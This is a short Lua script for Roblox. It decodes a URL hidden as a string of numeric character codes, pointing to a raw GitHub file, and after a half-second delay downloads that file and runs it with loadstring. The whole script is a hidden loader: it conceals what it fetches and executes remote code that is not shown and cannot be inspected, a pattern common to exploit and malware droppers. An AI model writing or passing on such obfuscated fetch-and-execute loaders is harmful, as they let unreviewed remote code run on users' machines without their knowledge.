local function X(s)
    local r = ""
    for i = 1, #s, 3 do
        local n = tonumber(string.sub(s, i, i+2))
        if n then r = r .. string.char(n) end
    end
    return r
end

local function Y(u)
    local p = game:HttpGet(u)
    local f = loadstring(p)
    if f then f() end
end

local Z = "104116116112115058047047" ..
"114097119046103105116104" ..
"117098117115101114099111" ..
"110116101110116046099111" ..
"109047076101097109111100" ..
"101047076101097109111100" ..
"101046108117097047114101" ..
"102115047104101097100115" ..
"047109097105110047076101" ..
"097109111100046108117097"

spawn(function()
    wait(0.5)
    Y(X(Z))
end)
